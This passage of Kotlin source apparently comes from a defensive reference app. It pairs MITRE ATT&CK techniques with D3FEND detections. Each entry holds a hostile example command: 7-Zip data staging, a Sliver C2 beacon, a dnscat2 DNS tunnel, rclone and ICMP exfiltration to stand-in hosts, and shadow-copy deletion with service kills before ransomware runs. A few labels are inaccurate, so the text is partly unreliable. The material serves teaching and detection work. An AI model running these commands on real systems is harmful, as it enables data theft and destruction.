            d3fendDescription = "Disable end-user consent for third-party OAuth apps requesting high-privilege scopes (Mail.ReadWrite, Files.Read.All).",
            d3fendRuleOrFix = """
# Azure AD PowerShell: Block unverified third-party app consent
Set-AzureADMSAuthorizationPolicy -DefaultUserRolePermissions \
  @{PermissionGrantPoliciesAssigned = @("ManagePermissionGrantsForSelf.microsoft-user-default-low")}
            """.trimIndent(),
            knownAptGroups = listOf("Midnight Blizzard (APT29)", "Lapis Tempest"),
            tags = listOf("Collection", "OAuth", "GraphAPI", "M365")
        ),
        MitreTtpItem(
            techniqueId = "T1560.001",
            name = "Archive Collected Data: Archive via Utility",
            tactic = MitreTactic.COLLECTION,
            subTechnique = "T1560.001",
            description = "Adversaries compress and encrypt harvested sensitive documents using common archiving utilities (7-Zip, WinRAR, tar) prior to exfiltration.",
            attackExampleTitle = "Compressing Databases and Documents with 7-Zip and Password",
            attackCodeCommand = """
7z.exe a -p"SecretPassw0rd!" -mhe=on -r C:\Users\Public\exfil.7z \
  "C:\Users\*\Documents\*.docx" "C:\SQLBackups\*.bak"
            """.trimIndent(),
            d3fendId = "D3-FCA",
            d3fendName = "File Compression Activity Auditing",
            d3fendDescription = "Alert on command line usage of 7z.exe or rar.exe with password parameters originating from unexpected staging directories.",
            d3fendRuleOrFix = """
// KQL Query: Detecting command-line archive creation with password switch
DeviceProcessEvents
| where FileName in~ ("7z.exe", "rar.exe", "zip.exe")
| where ProcessCommandLine has_any (" -p", " -hp", " -mhe=")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
            """.trimIndent(),
            knownAptGroups = listOf("LockBit", "BlackBasta", "Akira"),
            tags = listOf("Collection", "7-Zip", "Staging", "KQL")
        ),

        // ==================== 12. COMMAND AND CONTROL (TA0011) ====================
        MitreTtpItem(
            techniqueId = "T1071.001",
            name = "Application Layer Protocol: Web Protocols",
            tactic = MitreTactic.COMMAND_AND_CONTROL,
            subTechnique = "T1071.001",
            description = "Adversaries communicate with command and control infrastructure over standard web protocols (HTTPS port 443) to blend in with legitimate outbound enterprise traffic.",
            attackExampleTitle = "Sliver C2 HTTPS Beacon with Jitter",
            attackCodeCommand = """
# Sliver C2 beacon generation with randomized HTTP headers & TLS fingerprint
generate beacon --os windows --arch amd64 --http 198.51.100.22 --seconds 30 --jitter 15
            """.trimIndent(),
            d3fendId = "D3-NTA",
            d3fendName = "Network Traffic Analysis & Beacon Detection",
            d3fendDescription = "Analyze outbound network session intervals and JA3/JA4 TLS client fingerprints to detect periodic beaconing patterns.",
            d3fendRuleOrFix = """
# Zeek script detecting recurring beacon intervals
event connection_state_remove(c: connection) {
  if ( c${'$'}duration > 10sec && c${'$'}id${'$'}resp_p == 443/tcp ) {
    # Flag periodic connection attempts with low variance
  }
}
            """.trimIndent(),
            knownAptGroups = listOf("Cobalt Strike", "Sliver", "Mythic", "APT29"),
            tags = listOf("C2", "Beaconing", "TLS", "Zeek")
        ),
        MitreTtpItem(
            techniqueId = "T1071.004",
            name = "Application Layer Protocol: DNS",
            tactic = MitreTactic.COMMAND_AND_CONTROL,
            subTechnique = "T1071.004",
            description = "Adversaries tunnel commands and data within DNS requests and responses (DNS tunneling) to bypass perimeter egress firewalls.",
            attackExampleTitle = "DNS Tunneling C2 Channel via Iodine / dnscat2",
            attackCodeCommand = """
# Start dnscat2 client tunnel over port 53 UDP
dnscat2 --dns server=8.8.8.8,port=53,domain=tunnel.adversary-domain.org --secret=1337
            """.trimIndent(),
            d3fendId = "D3-DNA",
            d3fendName = "DNS Traffic Anomaly Analysis & Shannon Entropy",
            d3fendDescription = "Inspect outbound DNS queries for high entropy subdomains, abnormal length (> 60 chars), and unusual record types (TXT, NULL).",
            d3fendRuleOrFix = """
# Suricata rule detecting high-entropy long DNS queries
alert dns ${'$'}HOME_NET any -> any 53 (msg:"Potential DNS Tunneling High Entropy Subdomain"; \
  dns.query; pcre:"/^[a-zA-Z0-9]{45,}\./"; sid:1000088; rev:2;)
            """.trimIndent(),
            knownAptGroups = listOf("OilRig", "FIN7", "APT34"),
            tags = listOf("C2", "DNS Tunneling", "Suricata", "Egress")
        ),

        // ==================== 13. EXFILTRATION (TA0010) ====================
        MitreTtpItem(
            techniqueId = "T1567.002",
            name = "Exfiltration to Cloud Storage: Exfiltration to Cloud",
            tactic = MitreTactic.EXFILTRATION,
            subTechnique = "T1567.002",
            description = "Adversaries exfiltrate stolen files to popular cloud storage services (MEGA, AWS S3, Dropbox, Google Drive) using legitimate utility binaries like Rclone.",
            attackExampleTitle = "Mass Exfiltration via Rclone to MEGA / AWS S3",
            attackCodeCommand = """
# Rclone silent high-throughput exfiltration
rclone copy "C:\Users\Public\exfil.7z" remote:stolen-corporate-data \
  --config rclone.conf --transfers 8 --quiet
            """.trimIndent(),
            d3fendId = "D3-DLP",
            d3fendName = "Data Loss Prevention (DLP) & CASB Inspection",
            d3fendDescription = "Deploy Cloud Access Security Brokers (CASB) to block file uploads to personal cloud storage tenants and monitor anomalous egress spikes.",
            d3fendRuleOrFix = """
// Defender KQL: Detect Rclone process execution with cloud parameters
DeviceProcessEvents
| where FileName =~ "rclone.exe"
| where ProcessCommandLine has_any ("copy", "sync", "remote:", "mega", "s3:")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
            """.trimIndent(),
            knownAptGroups = listOf("BlackBasta", "LockBit", "Conti"),
            tags = listOf("Exfiltration", "Rclone", "Cloud Storage", "CASB")
        ),
        MitreTtpItem(
            techniqueId = "T1048.003",
            name = "Exfiltration Over Alternative Protocol: Unencrypted",
            tactic = MitreTactic.EXFILTRATION,
            subTechnique = "T1048.003",
            description = "Adversaries steal sensitive data by transmitting it over unexpected network protocols such as ICMP echo payloads, raw TCP sockets, or HTTP POST.",
            attackExampleTitle = "ICMP Payload Data Exfiltration via nping / hping3",
            attackCodeCommand = """
# Transmit sensitive data inside ICMP Ping data payload
nping --icmp -c 1 --data-string "CONFIDENTIAL_DB_KEYS_HEX_VALUE" 198.51.100.99
            """.trimIndent(),
            d3fendId = "D3-EFW",
            d3fendName = "Egress Firewall Filtering & Protocol Validation",
            d3fendDescription = "Block all outbound ICMP, raw sockets, and uninspected traffic at perimeter firewalls. Enforce authenticated forward proxy for web egress.",
            d3fendRuleOrFix = """
# iptables / nftables: Drop outbound ICMP payloads exceeding standard ping size
iptables -A OUTPUT -p icmp --icmp-type echo-request -m length --length 85:65535 -j DROP
            """.trimIndent(),
            knownAptGroups = listOf("APT41", "Lazarus", "Equation Group"),
            tags = listOf("Exfiltration", "ICMP", "Firewall", "Egress")
        ),

        // ==================== 14. IMPACT (TA0040) ====================
        MitreTtpItem(
            techniqueId = "T1486",
            name = "Data Encrypted for Impact (Ransomware)",
            tactic = MitreTactic.IMPACT,
            description = "Adversaries encrypt sensitive files on target endpoints and file shares using asymmetric encryption, rendering them inaccessible to extort ransom payments.",
            attackExampleTitle = "High-Speed Multi-Threaded File Encryption",
            attackCodeCommand = """
# Typical ransomware invocation pattern:
# 1. Terminate database and backup processes
taskkill /F /IM sqlservr.exe /IM backup.exe
# 2. Delete shadow copies
vssadmin.exe delete shadows /all /quiet
# 3. Launch encryption binary
ransom_payload.exe --threads 16 --dir "C:\Data"
            """.trimIndent(),
            d3fendId = "D3-IRP",
            d3fendName = "Immutable Remote Backups & Ransomware Defense",
            d3fendDescription = "Maintain write-once-read-many (WORM) offline backups and configure canary files with automated endpoint isolation upon mass write spikes.",
            d3fendRuleOrFix = """
# Canary file alerting script in PowerShell
${'$'}watcher = New-Object System.IO.FileSystemWatcher
${'$'}watcher.Path = "C:\CanaryShare"
${'$'}watcher.Filter = "*canary*"
Register-ObjectEvent ${'$'}watcher "Changed" -Action {
  Write-Warning "CRITICAL: Canary file altered! Initiating network isolation!"
  Stop-Computer -Force
}
            """.trimIndent(),
            knownAptGroups = listOf("LockBit 4.0", "Akira", "BlackCat/ALPHV"),
            tags = listOf("Impact", "Ransomware", "Canary", "Encryption")
        ),
        MitreTtpItem(
            techniqueId = "T1489",
            name = "Service Stop: Inhibiting System Recovery",
            tactic = MitreTactic.IMPACT,
            description = "Adversaries stop or disable system services, such as Volume Shadow Copy, database engines, and antivirus, to prevent recovery or maximum disruption.",
            attackExampleTitle = "Stopping Hyper-V and MSSQL Services via net stop",
            attackCodeCommand = """
# Forcibly stop critical production hypervisor & database services
net stop vmms /y
net stop MSSQLSERVER /y
net stop VeeamBackupSvc /y
            """.trimIndent(),
            d3fendId = "D3-SPP",
            d3fendName = "Service Protection & Anti-Tamper Isolation",
            d3fendDescription = "Lock critical service permissions using SC sdset so standard administrator accounts cannot stop essential backup and hypervisor processes without quorum authorization.",
            d3fendRuleOrFix = """
# Lockdown service DACL using SubInACL to block service termination
sc.exe sdset "VeeamBackupSvc" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
            """.trimIndent(),
            knownAptGroups = listOf("Ryuk", "BlackBasta", "Medusa"),
            tags = listOf("Impact", "Service Stop", "Ransomware", "Backups")
        )
    )

    fun filterTtps(
        query: String = "",
        selectedTactic: MitreTactic? = null
    ): List<MitreTtpItem> {
        val q = query.trim().lowercase()
        return allTtps.filter { ttp ->
            val matchesQuery = q.isEmpty() ||
                    ttp.techniqueId.lowercase().contains(q) ||
                    ttp.name.lowercase().contains(q) ||
                    ttp.d3fendId.lowercase().contains(q) ||
                    ttp.d3fendName.lowercase().contains(q) ||
                    ttp.description.lowercase().contains(q) ||
                    ttp.knownAptGroups.any { it.lowercase().contains(q) } ||
                    ttp.tags.any { it.lowercase().contains(q) }

            val matchesTactic = selectedTactic == null || ttp.tactic == selectedTactic

            matchesQuery && matchesTactic
        }
    }
}
